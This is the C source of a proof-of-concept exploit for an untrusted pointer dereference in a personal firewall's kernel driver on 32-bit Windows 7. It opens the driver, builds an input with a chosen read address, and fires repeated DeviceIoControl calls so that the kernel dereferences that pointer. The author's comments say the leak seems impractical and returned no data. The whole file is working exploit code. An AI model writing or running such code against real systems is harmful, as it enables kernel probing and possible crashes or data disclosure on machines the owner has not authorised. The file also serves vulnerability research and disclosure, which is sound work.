#include "exploit.h"

// While it is theoretically possible to retrieve data or potentially elevate privileges using this vulnerability, it does not appear practical.
// No data appeared to have been returned to either the input or output buffers.
int main(int argc, char** argv)
{
	INPUT_BUFFER input;
	HANDLE h_driver = CreateFileA(DEVICE, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	unsigned long bytes_returned = 0, unused_data = 0x44444444;
	unsigned char unused = 0;

	RtlSecureZeroMemory(&input, sizeof(input));

	SetConsoleTitleA("CVE-????-????");

	printf("[*] FortKnox Personal Firewall 9.0.305 Untrusted Pointer Dereference Information Disclosure\n[*] Tested [somewhat] successfully on Windows 7 SP1 Build 7601 32-bit\n[*] Exploit written by ExAllocatePool2\n[!] Let's exploit!");

	if (h_driver == (HANDLE)-1)
	{
		printf("\n[-] Failed to obtain a handle to the device driver. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Obtained a handle to the device driver. Handle Value: 0x%p", h_driver);

	memset(&input.Padding1, 0x41, sizeof(input.Padding1));
	memset(&input.Padding2, 0x43, sizeof(input.Padding2));
	input.ReadAddress = 0x42424242;
	printf("\n[+] Crafted input structure.");

	printf("\n<---------------- | Entering Danger Zone | ---------------->\n[!] Dereferncing kernel pointers...");
	for (int i = 0; i < 100; i++)
	{
		DeviceIoControl(h_driver, TARGET_IOCTL, &unused_data, 4, &input, sizeof(input), &bytes_returned, 0);
	}
	printf("\n[+] Dereferenced a pointer in the context of the kernel.\n");
	dump_hex(&input, sizeof(input));
	printf("\n<---------------- | Leaving Danger Zone | ---------------->\n[+] Exploitation complete.");
	unused = getchar();
	return 0;
}